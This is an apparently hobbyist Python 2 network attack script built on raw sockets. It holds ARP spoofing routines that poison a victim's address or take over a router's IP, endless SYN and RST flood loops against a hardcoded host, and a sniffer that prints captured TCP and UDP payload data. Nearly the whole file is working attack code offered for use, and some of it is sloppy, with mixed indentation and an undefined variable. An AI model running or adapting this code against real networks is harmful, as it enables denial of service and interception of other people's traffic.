import socket
import sys, getopt
from binascii import hexlify
from struct import *

rcheck = 0
scheck = 0

def eth_addr (a) :
  b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
  return b

def hex_mac_addr (a) :
  b = "%.2s:%.2s:%.2s:%.2s:%.2s:%.2s" % (chr(a[0]) , chr(a[1]) , chr(a[2]), chr(a[3]), chr(a[4]) , chr(a[5]))
  return b

def scream(victim_ip, device):
	scream_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
	scream_sock.bind((device, 0))
	victim_ip = victim_ip.split(".")
	hexip = []
	for a in range(0,len(victim_ip)):
		hexip.append(int(victim_ip[a]))

	eth_pkt = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x69, 0xbb, 0xff,
                         0xce, 0xbe, 0xef, 0x08, 0x06]
        arp_pkt = [0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02 ]
        arp_pkt_sndr_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_sndr_ip = [0xc0, 0xa8, 0x01, 0x01 ]
        arp_pkt_dst_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_dst_ip = [0xc0, 0xa8, 0x01, 0x02 ]
	
	arp_pkt_sndr_ip = hexip
	arp_pkt_dst_ip = hexip

	eth_payload = "".join(map(chr, eth_pkt))
        arp_payload = "".join(map(chr, arp_pkt + arp_pkt_sndr_mac + arp_pkt_sndr_ip
 + arp_pkt_dst_mac + arp_pkt_dst_ip))
	print "SCREAMING: " + str(victim_ip) + " has address ff:ff:ff:ff:ff:ff on ff:ff:ff:ff:ff"
	while True:
        	scream_sock.send(eth_payload + arp_payload)
	scream_sock.close()
	exit(0)

def rtr_takeover(takeover_ip, takeover_mac, device):
	takeover_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
	takeover_sock.bind((device, 0))
	takeover_ip = takeover_ip.split(".")
	hexip = []
	for a in range(0,len(takeover_ip)):
		hexip.append(int(takeover_ip[a]))

	rtr_mac = []
	new_mac = takeover_mac.split(":")
	for a in range(0, len(new_mac)):
		rtr_mac.append(int(new_mac[a]))

	eth_dst_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
	eth_sndr_mac = [0x69, 0xbb, 0xff,0xce, 0xbe, 0xef ]
	eth_type = [0x08, 0x06]
        arp_pkt = [0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02 ]
        arp_pkt_sndr_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_sndr_ip = [0xc0, 0xa8, 0x01, 0x01 ]
        arp_pkt_dst_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_dst_ip = [0xc0, 0xa8, 0x01, 0x02 ]
	
	eth_sndr_mac = rtr_mac
	arp_pkt_sndr_mac = rtr_mac
	arp_pkt_sndr_ip = hexip
	arp_pkt_dst_ip = hexip
	
	eth_payload = "".join(map(chr, eth_dst_mac + eth_sndr_mac + eth_type))
        arp_payload = "".join(map(chr, arp_pkt + arp_pkt_sndr_mac + arp_pkt_sndr_ip
 + arp_pkt_dst_mac + arp_pkt_dst_ip))
	print "Taking over router: " + str(victim_ip) + " with MAC address " + str(takeover_mac)
	while True:
        	takeover_sock.send(eth_payload + arp_payload)
	takeover_sock.close()
	exit(0)

def syn_flood(target_ip):
	# get mac of localhost, get mac o default gateway
	flood_ip = ""
	flood_ip = flood_ip.split(".")
	hexip = []
	#for a in range(0,len(flood_ip)):
	#	hexip.append(int(flood_ip[a]))

	eth_pkt = [0x58, 0x6d, 0x8f, 0x99, 0x0a, 0xa6, 0x18, 0x65, 0x90, 0xda, 0x38, 0xdb, 0x08, 0x00 ]
	ip_hdr_primer = [0x45, 0x00, 0x00, 0x3c, 0x53, 0xf4, 0x40, 0x00 ]
	ip_ttl_protocol_checksum = [ 0x40, 0x06, 0xf2, 0xfd ]
	ip_src = [ 0xc0, 0xa8, 0x01, 0x6a ]
	ip_dst = [ 0x0d, 0x3b, 0x24, 0x7d ]
	#ip_dst = hexip
	#tcp_src_port = hexlify(target_port)
	tcp_src_port = [ 0x85, 0x00 ]
	tcp_dst_port = [ 0x00, 0x50 ]
	tcp_hdr_end = [ 0xd3, 0x42, 0xff, 0xed, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x02, 0x72, 0x10, 0xdd, 0x7f, 0x00, 0x00, 0x02, 0x04, 0x05, 0xb4, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x0b, 0xac, 0x19, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x07 ]
	
	eth_payload = "".join(map(chr, eth_pkt))
	ip_payload = "".join(map(chr, ip_hdr_primer + ip_ttl_protocol_checksum + ip_src + ip_dst))
	tcp_payload = "".join(map(chr, tcp_src_port + tcp_dst_port + tcp_hdr_end))
	syn_pkt = eth_payload + ip_payload + tcp_payload

	while True:
		#syn_flood_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		syn_flood_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
		
		syn_flood_socket.bind(("eth0", 0))
		syn_flood_socket.send(syn_pkt)

def rst_flood():
	# get mac of localhost, get mac o default gateway
	flood_ip = ""
	flood_ip = flood_ip.split(".")
	hexip = []
	#for a in range(0,len(flood_ip)):
	#	hexip.append(int(flood_ip[a]))

	eth_pkt = [0x58, 0x6d, 0x8f, 0x99, 0x0a, 0xa6, 0x18, 0x65, 0x90, 0xda, 0x38, 0xdb, 0x08, 0x00 ]
	ip_hdr_primer = [0x45, 0x00, 0x00, 0x28, 0x53, 0xf4, 0x40, 0x00 ]
	ip_ttl_protocol_checksum = [ 0x40, 0x06, 0xf2, 0xfd ]
	ip_src = [ 0xc0, 0xa8, 0x01, 0x6a ]
	ip_dst = [ 0x0d, 0x3b, 0x24, 0x7d ]
	#ip_dst = hexip
	#tcp_src_port = hexlify(target_port)
	tcp_src_port = [ 0x85, 0x00 ]
	tcp_dst_port = [ 0x00, 0x50 ]
	tcp_hdr_end = [ 0xd3, 0x42, 0xff, 0xed, 0x00, 0x00, 0x00, 0x00, 0x50, 0x04, 0x00, 0x00, 0x2d, 0x87, 0x00, 0x00 ]
	
	eth_payload = "".join(map(chr, eth_pkt))
	ip_payload = "".join(map(chr, ip_hdr_primer + ip_ttl_protocol_checksum + ip_src + ip_dst))
	tcp_payload = "".join(map(chr, tcp_src_port + tcp_dst_port + tcp_hdr_end))
	rst_pkt = eth_payload + ip_payload + tcp_payload

	while True:
		#syn_flood_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		rst_flood_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
		
		rst_flood_socket.bind(("eth0", 0))
		rst_flood_socket.send(rst_pkt)
	

params = []
filter_dst_port = ""
key = ""
src_ip = ""
dst_ip = ""

argv = sys.argv[1:]
try:
        opts, args = getopt.getopt(argv, "x:s:r:f", ['mac=', 'dev=', 'key=', 'ip=', 'port='])
except getopt.GetoptError as geter:
        print geter

rcheck = 0
fcheck = 0
scheck = 0
xcheck = 0

try:
	for opt, arg in opts:
		if '--port' in opt:
			filter_dst_port = int(arg)
		elif '--key' in opt:
			key = arg
		elif '--ip' in opt:
			victim_ip = arg
			filter_host = arg
		elif '--dev' in opt:
			device = arg
		elif '--mac' in opt:
			takeover_mac = arg
		elif '--track' in opt:
			track = 1
		elif '-s' in opt:
			scheck = 1
		elif '-r' in opt:
			rcheck = 1
		elif '-f' in opt:
			fcheck = 1
		elif '-x' in opt:
			xcheck = 1
except NameError as ner:
	print ner

try:
	filter_host
	filter_dst_port
except NameError:
	filtered = 0
else:
	filtered = 1

if rcheck == 1:
	rtr_takeover(victim_ip, takeover_mac, device)
elif scheck == 1:
	scream(victim_ip, device)
elif fcheck == 1:
	syn_flood(victim_ip)
elif xcheck == 1:
	rst_flood()

seq_trk = 0
argv = sys.argv[1:]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

while True:
	pkt = s.recvfrom(65565)
	eth_header = pkt[0][0:14]
	eth_length = 14
        eth = unpack("!6s6s2s", eth_header)
	dst_mac = eth_addr(eth[0])
        src_mac = eth_addr(eth[1])
        eth_type = hexlify(eth[2])

	if eth_type == '0806':
		arp_header = pkt[0][14:42]
		arp = unpack("2s2s1s1s2s6s4s6s4s", arp_header)
                hw_type = arp[0]
                protocol_type = arp[1]
                hw_size = arp[2]
                protocol_size = arp[3]
                opcode = arp[4]
                sndr_mac = eth_addr(arp[5])
                sndr_ip = socket.inet_ntoa(arp[6])
                target_mac = eth_addr(arp[7])
                target_ip = socket.inet_ntoa(arp[8])
		if filtered == 0:
        		print "Ether DST MAC: " + str(dst_mac) + " Ether SRC MAC: " + str(src_mac) + " TYPE " + str(eth_type)
                	print "ARP DST MAC: " + str(target_mac) + " Ether SRC:MAC " + str(sndr_mac)
                	print "IP " + sndr_ip + " is asking who has " + target_ip
                	print opcode
		
	elif eth_type == '0800':
		ip_header = pkt[0][14:34]
		iph_length = len(ip_header)
		#iph = unpack('!1s1s2s2s2s1s1s2s4s4s' , ip_header)
		iph = unpack('!BBHHHBBH4s4s' , ip_header)

		version_ihl = iph[0]
		version = version_ihl >> 4
		ihl = version_ihl & 0xF
		iph_length = ihl * 4

		ttl = iph[5]
		protocol = iph[6]
		s_addr = socket.inet_ntoa(iph[8]);
		d_addr = socket.inet_ntoa(iph[9]);
		
		if protocol == 6:
			tcp_header = pkt[0][34:54]
			#tcph = unpack('!2s2s4s4s2s2s2s2s12s' , tcp_header)
			tcph = unpack('!HHLLBBHHH' , tcp_header)

			source_port = tcph[0]
			dest_port = tcph[1]
			sequence = tcph[2]
			ack = tcph[3]
			doff_reserved = tcph[4]
			tcph_length = doff_reserved >> 4
	
			h_size = eth_length + iph_length + tcph_length * 4
			data_size = len(pkt) - h_size
			data = pkt[0][54:data_size]
			if filtered == 0:
        			print "Ether DST MAC: " + str(dst_mac) + " Ether SRC MAC: " + str(src_mac) + " TYPE " + str(eth_type)
				print "IP - SRC IP: " + str(s_addr) + " DST IP: " + str(d_addr)
				print "TCP SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port) + " SEQ: " + str(sequence) + " ACK: " + str(ack)
				print "PKT DATA: " + str(data)
			elif filtered == 1:
				try:
					filter_dst_port
				except NameError:
					if (filter_host == str(s_addr)) or (filter_host == str(d_addr)):
        					print "Ether DST MAC: " + str(dst_mac) + " Ether SRC MAC: " + str(src_mac) + " TYPE " + str(eth_type)
						print "IP - SRC IP: " + str(s_addr) + " DST IP: " + str(d_addr)
				else:
					if (str(source_port) == filter_dst_port) or (str(dest_port) == filter_dst_port):
						if (filter_host == str(s_addr)) or (filter_host == str(d_addr)):
        						print "Ether DST MAC: " + str(dst_mac) + " Ether SRC MAC: " + str(src_mac) + " TYPE " + str(eth_type)
							print "IP - SRC IP: " + str(s_addr) + " DST IP: " + str(d_addr)
							print "TCP SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port) + " SEQ: " + str(sequence) + " ACK: " + str(ack)
							print "PKT DATA: " + str(data)
		
		elif protocol == 17: 
			udp_header = pkt[0][34:42]
			udph = unpack('!HHHH' , udp_header)
			
			source_port = udph[0]
			dest_port = udph[1]
			udp_length = udph[2]
			checksum = udph[3]
			h_size = eth_length + iph_length + 8
			data_size = len(pkt) - h_size
			data = pkt[0][42:data_size]
			if filtered == 0:
				print "UDP SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port)
				print "PKT DATA: " + str(data)
			elif filtered == 1:
				try:
					filter_dst_port
				except NameError:
					if (filter_host == str(s_addr)) or (filter_host == str(d_addr)):
						print "UDP SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port)
						print "PKT DATA: " + str(data)
				else:
					if (str(source_port) == filter_dst_port) or (str(dest_port) == filter_dst_port):
						if (filter_host == str(s_addr)) or (filter_host == str(d_addr)):
							print "UDP SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port)
							print "PKT DATA: " + str(data)
					
		
		elif protocol == 1:
			icmp_header = pkt[0][34:38]
			icmph = unpack('!BBH' , icmp_header)
			icmp_type = icmph[0]
			code = icmph[1]
			checksum = icmph[2]
			h_size = eth_length + iph_length + 4
			data_size = len(pkt) - h_size
			data = pkt[0][38:data_size]
			print "ICMP TYPE: " + str(icmp_type) + " PKT DATA " + data
			

		if (seq_trk == d_addr):
			if data != "":
				print data
	
		#if seq_trk == sequence:	
		#	print "Ether SRC: " + str(src_mac) + " DST MAC: " + str(dst_mac) + " TCP SRC: " + str(s_addr) + " DST: " + str(d_addr) + " SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port) + " Data: " + str(data)

		#if (source_port == filter_dst_port) or (dest_port == filter_dst_port) and (filter_host == str(s_addr)) or (filter_host == str(d_addr)):
		#	print "Ether SRC: " + str(src_mac) + " Ether DST " + str(dst_mac) + " TCP SRC: " + str(s_addr) + " DST: " + str(d_addr) + " SRC-PORT: " + str(source_port) + " DST-PORT: " + str(dest_port) + " SEQ: " + str(sequence) + " ACK: " + str(ack) + " Data: " + str(data)
		#	if track == 1:
		#		seq_trk = int(sequence)

